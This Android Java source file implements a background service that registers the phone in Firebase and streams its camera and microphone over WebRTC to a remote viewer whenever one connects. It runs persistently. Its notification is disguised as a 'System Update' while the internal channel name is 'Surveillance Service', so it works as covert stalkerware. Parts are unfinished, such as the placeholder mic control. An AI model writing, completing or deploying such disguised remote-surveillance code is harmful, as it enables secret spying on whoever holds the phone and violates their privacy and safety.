package com.broadcaster;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import org.webrtc.SessionDescription;
import org.webrtc.IceCandidate;

import java.util.HashMap;
import java.util.Map;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_ID = "SurveillanceChannel";
    private static final int NOTIFICATION_ID = 1;
    
    private WebRTCManager webRTCManager;
    private FirebaseSignalingClient signalingClient;
    private DatabaseReference deviceRef;
    private String deviceId;
    private boolean isStreaming = false;
    
    // Camera and mic state (off by default for battery saving)
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isCameraActive = false;
    private MediaRecorder mediaRecorder;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize camera manager
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access error: " + e.getMessage());
        }
        
        initFirebase();
        initWebRTC();
        
        // Keep camera and mic OFF until viewer connects
        setCameraState(false);
        setMicState(false);
    }
    
    private void initFirebase() {
        // Get unique device ID
        deviceId = getUniqueDeviceId();
        
        // Register device in Firebase
        deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
        
        Map<String, Object> deviceInfo = new HashMap<>();
        deviceInfo.put("deviceId", deviceId);
        deviceInfo.put("status", "online");
        deviceInfo.put("timestamp", ServerValue.TIMESTAMP);
        
        deviceRef.setValue(deviceInfo);
        deviceRef.onDisconnect().setValue(null);
    }
    
    // Get unique device ID - renamed to avoid conflict with parent class
    private String getUniqueDeviceId() {
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (androidId == null || androidId.isEmpty()) {
            androidId = "default_device";
        }
        return androidId;
    }
    
    private void initWebRTC() {
        webRTCManager = new WebRTCManager(this);
        webRTCManager.setCallback(new WebRTCManager.WebRTCCallback() {
            @Override
            public void onLocalDescription(SessionDescription sdp) {
                if (sdp.type == SessionDescription.Type.OFFER) {
                    signalingClient.sendOffer(sdp);
                } else if (sdp.type == SessionDescription.Type.ANSWER) {
                    signalingClient.sendAnswer(sdp);
                }
            }
            
            @Override
            public void onIceCandidate(IceCandidate candidate) {
                signalingClient.sendIceCandidate(candidate);
            }
            
            @Override
            public void onConnected() {
                Log.d(TAG, "WebRTC connected - viewer is watching");
                // Start camera and mic ONLY when viewer connects
                startCameraAndMic();
                updateDeviceStatus("streaming");
            }
            
            @Override
            public void onDisconnected() {
                Log.d(TAG, "WebRTC disconnected - no viewers");
                // Stop camera and mic to save battery
                stopCameraAndMic();
                updateDeviceStatus("online");
            }
            
            @Override
            public void onError(String error) {
                Log.e(TAG, "WebRTC error: " + error);
                updateDeviceStatus("error");
            }
        });
        
        // Initialize signaling client - using no-argument constructor
        signalingClient = new FirebaseSignalingClient();
        signalingClient.setDeviceId(deviceId);
        signalingClient.setListener(new FirebaseSignalingClient.SignalingListener() {
            @Override
            public void onOfferReceived(SessionDescription offer) {
                Log.d(TAG, "Offer received from viewer");
                webRTCManager.createPeerConnection();
                webRTCManager.setRemoteDescription(offer);
                webRTCManager.createAnswer();
            }
            
            @Override
            public void onAnswerReceived(SessionDescription answer) {
                Log.d(TAG, "Answer received from viewer");
                webRTCManager.setRemoteDescription(answer);
            }
            
            @Override
            public void onIceCandidateReceived(IceCandidate candidate) {
                Log.d(TAG, "ICE candidate received from viewer");
                webRTCManager.addIceCandidate(candidate);
            }
            
            @Override
            public void onHangUp() {
                Log.d(TAG, "Hang up received");
                stopStreaming();
            }
        });
        
        signalingClient.listenForSignals();
        
        // Prepare WebRTC but don't start streaming until viewer connects
        webRTCManager.createPeerConnection();
    }
    
    private void startCameraAndMic() {
        if (isStreaming) return;
        
        isStreaming = true;
        Log.d(TAG, "Starting camera and mic for viewer");
        
        // Actually start the WebRTC stream
        webRTCManager.startStreaming();
        
        setCameraState(true);
        setMicState(true);
    }
    
    private void stopCameraAndMic() {
        if (!isStreaming) return;
        
        isStreaming = false;
        Log.d(TAG, "Stopping camera and mic - battery saving mode");
        
        webRTCManager.stopStreaming();
        
        setCameraState(false);
        setMicState(false);
    }
    
    private void setCameraState(boolean active) {
        isCameraActive = active;
        try {
            if (cameraManager != null && cameraId != null) {
                cameraManager.setTorchMode(cameraId, false);
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera state change error: " + e.getMessage());
        }
    }
    
    private void setMicState(boolean active) {
        // Implement microphone control
        // This is a placeholder - actual mic control depends on your implementation
        Log.d(TAG, "Mic state: " + (active ? "ON" : "OFF"));
    }
    
    private void stopStreaming() {
        stopCameraAndMic();
        updateDeviceStatus("online");
    }
    
    private void updateDeviceStatus(String status) {
        if (deviceRef != null) {
            Map<String, Object> update = new HashMap<>();
            update.put("status", status);
            update.put("timestamp", ServerValue.TIMESTAMP);
            deviceRef.updateChildren(update);
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Surveillance Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System update service running");
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Preparing system components...")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        stopCameraAndMic();
        
        if (webRTCManager != null) {
            webRTCManager.dispose();
        }
        
        if (signalingClient != null) {
            signalingClient.cleanup();
        }
        
        if (deviceRef != null) {
            deviceRef.removeValue();
        }
        
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
